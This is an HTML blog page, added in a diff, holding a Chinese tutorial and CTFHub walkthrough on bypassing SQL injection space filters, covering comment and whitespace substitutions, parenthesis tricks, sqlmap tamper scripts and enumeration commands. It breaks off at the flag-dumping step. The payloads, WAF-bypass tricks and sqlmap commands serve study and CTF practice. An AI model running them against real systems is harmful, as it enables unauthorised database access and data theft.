@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/san-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=san-blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>SQL 注入空格过滤绕过：原理、手法与 sqlmap 实战 | 东阳的安全笔记</title>
+<meta name="keywords" content="CTF, Web安全, SQL注入, WAF绕过, sqlmap, 空格过滤">
+<meta name="description" content="一、什么是空格过滤
+空格过滤是指目标系统（WAF、Web 应用代码或中间件）对 HTTP 请求中的空格字符进行检测、替换或删除，以阻止 SQL 注入攻击的一种防御手段。
+1.1 过滤的实现方式
+代码层面
+// 直接删除所有空格
+$input = str_replace(&#34; &#34;, &#34;&#34;, $_GET[&#39;id&#39;]);
+
+// 替换为空
+$input = str_replace(&#34; &#34;, &#34;&#34;, $_GET[&#39;id&#39;]);
+
+// 正则匹配删除所有空白字符
+$input = preg_replace(&#39;/\s&#43;/&#39;, &#39;&#39;, $_GET[&#39;id&#39;]);
+WAF 层面
+WAF 规则检测到 SQL 关键字（如 UNION、SELECT、AND）前后存在空格时，直接拦截请求。例如：
+规则：IF (request_body CONTAINS &#34;UNION SELECT&#34;) THEN BLOCK
+此时攻击者如果不使用空格，而是写成 UNION/**/SELECT，规则可能无法匹配。
+1.2 为什么空格是关键
+SQL 语句的语法结构依赖空格作为分隔符：
+SELECT id, name FROM users WHERE id = 1 AND status = &#39;active&#39;
+        ↑    ↑         ↑      ↑   ↑ ↑   ↑       ↑
+      空格分隔关键字、标识符、运算符
+当空格被删除后：
+SELECTid,nameFROMusersWHEREid=1ANDstatus=&#39;active&#39;
+整条语句变成一团，MySQL 解析器无法识别各个 token，SQL 注入 payload 失效。
+
+二、空格过滤的绕过手法
+空格过滤并非不可突破。SQL 解析器认可的「空白等价物」远不止空格一种。
+2.1 注释符 /**/
+MySQL 支持 C 风格的多行注释 /**/，注释内容可以为空，效果等同于一个空格：">
+<meta name="author" content="东阳">
+<link rel="canonical" href="http://localhost:1313/san-blog/posts/sql-injection-space-filter-bypass/">
+<link crossorigin="anonymous" href="/san-blog/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/san-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/san-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/san-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/san-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/san-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/san-blog/posts/sql-injection-space-filter-bypass/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/san-blog/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/posts/" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/san-blog/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/san-blog/posts/">Posts</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+    <h1 class="post-title entry-hint-parent">
+      SQL 注入空格过滤绕过：原理、手法与 sqlmap 实战
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-06-03 23:00:00 +0800 CST'>June 3, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>630 words</span>&nbsp;·&nbsp;<span>东阳</span>
+
+</div>
+  </header> 
+  <div class="post-content md-content"><h2 id="一什么是空格过滤">一、什么是空格过滤<a hidden class="anchor" aria-hidden="true" href="#一什么是空格过滤">#</a></h2>
+<p>空格过滤是指目标系统（WAF、Web 应用代码或中间件）对 HTTP 请求中的空格字符进行<strong>检测、替换或删除</strong>，以阻止 SQL 注入攻击的一种防御手段。</p>
+<h3 id="11-过滤的实现方式">1.1 过滤的实现方式<a hidden class="anchor" aria-hidden="true" href="#11-过滤的实现方式">#</a></h3>
+<p><strong>代码层面</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 直接删除所有空格
+</span></span></span><span style="display:flex;"><span>$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $_GET[<span style="color:#e6db74">&#39;id&#39;</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 替换为空
+</span></span></span><span style="display:flex;"><span>$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $_GET[<span style="color:#e6db74">&#39;id&#39;</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 正则匹配删除所有空白字符
+</span></span></span><span style="display:flex;"><span>$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/\s+/&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $_GET[<span style="color:#e6db74">&#39;id&#39;</span>]);
+</span></span></code></pre></div><p><strong>WAF 层面</strong></p>
+<p>WAF 规则检测到 SQL 关键字（如 <code>UNION</code>、<code>SELECT</code>、<code>AND</code>）前后存在空格时，直接拦截请求。例如：</p>
+<pre tabindex="0"><code>规则：IF (request_body CONTAINS &#34;UNION SELECT&#34;) THEN BLOCK
+</code></pre><p>此时攻击者如果不使用空格，而是写成 <code>UNION/**/SELECT</code>，规则可能无法匹配。</p>
+<h3 id="12-为什么空格是关键">1.2 为什么空格是关键<a hidden class="anchor" aria-hidden="true" href="#12-为什么空格是关键">#</a></h3>
+<p>SQL 语句的语法结构依赖空格作为分隔符：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> id, name <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> status <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;active&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">↑</span>    <span style="color:#960050;background-color:#1e0010">↑</span>         <span style="color:#960050;background-color:#1e0010">↑</span>      <span style="color:#960050;background-color:#1e0010">↑</span>   <span style="color:#960050;background-color:#1e0010">↑</span> <span style="color:#960050;background-color:#1e0010">↑</span>   <span style="color:#960050;background-color:#1e0010">↑</span>       <span style="color:#960050;background-color:#1e0010">↑</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#960050;background-color:#1e0010">空格分隔关键字、标识符、运算符</span>
+</span></span></code></pre></div><p>当空格被删除后：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>SELECTid,nameFROMusersWHEREid<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>ANDstatus<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;active&#39;</span>
+</span></span></code></pre></div><p>整条语句变成一团，MySQL 解析器无法识别各个 token，SQL 注入 payload 失效。</p>
+<hr>
+<h2 id="二空格过滤的绕过手法">二、空格过滤的绕过手法<a hidden class="anchor" aria-hidden="true" href="#二空格过滤的绕过手法">#</a></h2>
+<p>空格过滤并非不可突破。SQL 解析器认可的「空白等价物」远不止空格一种。</p>
+<h3 id="21-注释符-">2.1 注释符 <code>/**/</code><a hidden class="anchor" aria-hidden="true" href="#21-注释符-">#</a></h3>
+<p>MySQL 支持 C 风格的多行注释 <code>/**/</code>，注释内容可以为空，效果等同于一个空格：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 原始
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span> <span style="color:#66d9ef">SELECT</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 绕过
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span><span style="color:#75715e">/**/</span><span style="color:#66d9ef">SELECT</span><span style="color:#75715e">/**/</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>
+</span></span></code></pre></div><p><strong>优点</strong>：通用性强，几乎所有场景可用。
+<strong>缺点</strong>：部分 WAF 会检测 <code>/**/</code> 模式并拦截。</p>
+<h3 id="22-url-编码换行-0a">2.2 URL 编码换行 <code>%0a</code><a hidden class="anchor" aria-hidden="true" href="#22-url-编码换行-0a">#</a></h3>
+<p>HTTP 请求中，换行符（LF，<code>\n</code>）经 URL 编码为 <code>%0a</code>，SQL 解析器将其视为有效的 token 分隔符：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 绕过
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>aSELECT<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>a1,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>
+</span></span></code></pre></div><p><strong>优点</strong>：WAF 通常不拦截换行符。
+<strong>缺点</strong>：如果目标用 <code>preg_replace('/\s+/', '', $input)</code> 过滤了所有空白字符（<code>\s</code> 包含换行），则失效。</p>
+<h3 id="23-tab-字符-09">2.3 Tab 字符 <code>%09</code><a hidden class="anchor" aria-hidden="true" href="#23-tab-字符-09">#</a></h3>
+<p>Tab（<code>\t</code>）同样被 SQL 解析器视为分隔符：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">UNION</span><span style="color:#f92672">%</span><span style="color:#ae81ff">09</span><span style="color:#66d9ef">SELECT</span><span style="color:#f92672">%</span><span style="color:#ae81ff">091</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>
+</span></span></code></pre></div><h3 id="24-括号-">2.4 括号 <code>()</code><a hidden class="anchor" aria-hidden="true" href="#24-括号-">#</a></h3>
+<p>通过括号包裹子查询或表达式，可以在不使用空格的情况下构造合法 SQL：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- 原始
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 绕过
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>(<span style="color:#f92672">*</span>)<span style="color:#66d9ef">FROM</span>(users)<span style="color:#66d9ef">WHERE</span>(id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">AND</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 子查询包裹
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span>(<span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">FROM</span>(DUAL)<span style="color:#66d9ef">WHERE</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span>(<span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p><strong>优点</strong>：不依赖任何空白字符，纯粹的语法技巧。
+<strong>缺点</strong>：构造复杂，可读性差，某些场景无法完全替代空格。</p>
+<h3 id="25--号url-上下文中">2.5 <code>+</code> 号（URL 上下文中）<a hidden class="anchor" aria-hidden="true" href="#25--号url-上下文中">#</a></h3>
+<p>在 URL 查询字符串中，<code>+</code> 会被解析为空格。但此技巧仅在<strong>服务端将 <code>+</code> 解码为空格</strong>时有效，且 SQL 语句内部并不识别 <code>+</code> 作为分隔符，所以适用范围有限：</p>
+<pre tabindex="0"><code>?id=1+UNION+SELECT+1,2,3
+</code></pre><p><strong>注意</strong>：这只是 URL 编码层面的技巧，并非 SQL 语法层面的绕过。</p>
+<h3 id="26-反引号与引号技巧">2.6 反引号与引号技巧<a hidden class="anchor" aria-hidden="true" href="#26-反引号与引号技巧">#</a></h3>
+<p>在 MySQL 中，反引号包裹的标识符前后可以不需要空格：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span><span style="color:#f92672">`</span>id<span style="color:#f92672">`</span><span style="color:#66d9ef">FROM</span><span style="color:#f92672">`</span>users<span style="color:#f92672">`</span><span style="color:#66d9ef">WHERE</span><span style="color:#f92672">`</span>id<span style="color:#f92672">`=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>但这只适用于标识符，不适用于关键字（如 <code>SELECT</code>、<code>FROM</code> 本身不能用反引号包裹来省略空格）。</p>
+<h3 id="27-综合对比">2.7 综合对比<a hidden class="anchor" aria-hidden="true" href="#27-综合对比">#</a></h3>
+<table>
+	<thead>
+			<tr>
+					<th>绕过方式</th>
+					<th>示例</th>
+					<th>适用数据库</th>
+					<th>对抗 <code>preg_replace('/\s+/', '')</code></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>/**/</code></td>
+					<td><code>UNION/**/SELECT</code></td>
+					<td>MySQL/MSSQL/Oracle</td>
+					<td>有效</td>
+			</tr>
+			<tr>
+					<td><code>%0a</code></td>
+					<td><code>UNION%0aSELECT</code></td>
+					<td>通用</td>
+					<td><strong>无效</strong>（<code>\s</code> 包含换行）</td>
+			</tr>
+			<tr>
+					<td><code>%09</code></td>
+					<td><code>UNION%09SELECT</code></td>
+					<td>通用</td>
+					<td><strong>无效</strong>（<code>\s</code> 包含 Tab）</td>
+			</tr>
+			<tr>
+					<td><code>()</code></td>
+					<td><code>SELECT(1)FROM(DUAL)</code></td>
+					<td>通用</td>
+					<td>有效</td>
+			</tr>
+	</tbody>
+</table>
+<p><strong>核心策略</strong>：如果目标只删普通空格，用 <code>/**/</code> 最方便；如果目标删所有空白字符（<code>\s+</code>），用括号包裹。</p>
+<hr>
+<h2 id="三sqlmap-自动化绕过">三、sqlmap 自动化绕过<a hidden class="anchor" aria-hidden="true" href="#三sqlmap-自动化绕过">#</a></h2>
+<p>sqlmap 内置了数十个 <strong>tamper 脚本</strong>，专门用于自动化绕过各类过滤和 WAF。</p>
+<h3 id="31-查看所有-tamper">3.1 查看所有 tamper<a hidden class="anchor" aria-hidden="true" href="#31-查看所有-tamper">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py --list-tampers
+</span></span></code></pre></div><h3 id="32-空格过滤相关-tamper">3.2 空格过滤相关 tamper<a hidden class="anchor" aria-hidden="true" href="#32-空格过滤相关-tamper">#</a></h3>
+<table>
+	<thead>
+			<tr>
+					<th>tamper 脚本</th>
+					<th>功能</th>
+					<th>适用场景</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><code>space2comment</code></td>
+					<td>空格 → <code>/**/</code></td>
+					<td>最常用，通用性强</td>
+			</tr>
+			<tr>
+					<td><code>space2randomblank</code></td>
+					<td>空格 → 随机空白字符（<code>%0a</code>、<code>%0d</code>、<code>%09</code>）</td>
+					<td>对抗简单空格过滤</td>
+			</tr>
+			<tr>
+					<td><code>space2plus</code></td>
+					<td>空格 → <code>+</code></td>
+					<td>URL 参数场景</td>
+			</tr>
+			<tr>
+					<td><code>space2mssqlblank</code></td>
+					<td>空格 → MSSQL 特有空白字符</td>
+					<td>SQL Server 环境</td>
+			</tr>
+			<tr>
+					<td><code>between</code></td>
+					<td><code>&gt;</code>、<code>=</code> 等 → <code>BETWEEN ... AND ...</code></td>
+					<td>配合空格绕过</td>
+			</tr>
+	</tbody>
+</table>
+<h3 id="33-使用方法">3.3 使用方法<a hidden class="anchor" aria-hidden="true" href="#33-使用方法">#</a></h3>
+<p><strong>单个 tamper</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://target.com/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --tamper<span style="color:#f92672">=</span>space2comment <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch
+</span></span></code></pre></div><p><strong>多个 tamper 叠加</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://target.com/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --tamper<span style="color:#f92672">=</span>space2comment,between <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch
+</span></span></code></pre></div><p>tamper 按顺序依次处理 payload，前一个的输出作为后一个的输入。</p>
+<h3 id="34-自定义-tamper">3.4 自定义 tamper<a hidden class="anchor" aria-hidden="true" href="#34-自定义-tamper">#</a></h3>
+<p>如果内置 tamper 不够用，可以编写自己的 tamper 脚本，放在 <code>tamper/</code> 目录下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># tamper/custom_space.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>NORMAL
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;用括号包裹所有空格分隔处&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> payload:
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;/**/&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
+</span></span></code></pre></div><p>使用：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://target.com/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --tamper<span style="color:#f92672">=</span>custom_space <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch
+</span></span></code></pre></div><hr>
+<h2 id="四实操ctfhub-过滤空格题目">四、实操：CTFHub 过滤空格题目<a hidden class="anchor" aria-hidden="true" href="#四实操ctfhub-过滤空格题目">#</a></h2>
+<h3 id="41-题目信息">4.1 题目信息<a hidden class="anchor" aria-hidden="true" href="#41-题目信息">#</a></h3>
+<ul>
+<li><strong>平台</strong>：CTFHub</li>
+<li><strong>题目</strong>：过滤空格</li>
+<li><strong>目标</strong>：<code>http://challenge-c96524a38aaae11e.sandbox.ctfhub.com:10800/?id=1</code></li>
+</ul>
+<h3 id="42-手工验证">4.2 手工验证<a hidden class="anchor" aria-hidden="true" href="#42-手工验证">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 正常请求</span>
+</span></span><span style="display:flex;"><span>curl -s <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 带空格的 payload（被过滤，页面返回异常或空）</span>
+</span></span><span style="display:flex;"><span>curl -s <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#39; AND 1=1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 用 /**/ 替换空格（绕过成功）</span>
+</span></span><span style="display:flex;"><span>curl -s <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#39;/**/AND/**/1=1&#34;</span>
+</span></span></code></pre></div><h3 id="43-sqlmap-自动检测">4.3 sqlmap 自动检测<a hidden class="anchor" aria-hidden="true" href="#43-sqlmap-自动检测">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --tamper<span style="color:#f92672">=</span>space2comment <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch
+</span></span></code></pre></div><p>sqlmap 输出：</p>
+<pre tabindex="0"><code>Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 3724 FROM (SELECT(SLEEP(5)))jOAZ)
+</code></pre><blockquote>
+<p>注意：session 中显示的 payload 是原始版本，实际发出的请求已被 tamper 处理为 <code>id=1/**/AND/**/(SELECT/**/3724/**/FROM/**/(SELECT(SLEEP(5)))jOAZ)</code>。</p>
+</blockquote>
+<h3 id="44-利用流程">4.4 利用流程<a hidden class="anchor" aria-hidden="true" href="#44-利用流程">#</a></h3>
+<p><strong>Step 1：枚举表名</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --tamper<span style="color:#f92672">=</span>space2comment <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --tables
+</span></span></code></pre></div><p><strong>Step 2：枚举列名</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --tamper<span style="color:#f92672">=</span>space2comment <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  --batch --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>  -D sqli -T &lt;表名&gt; --columns
+</span></span></code></pre></div><p><strong>Step 3：Dump flag</strong></p>
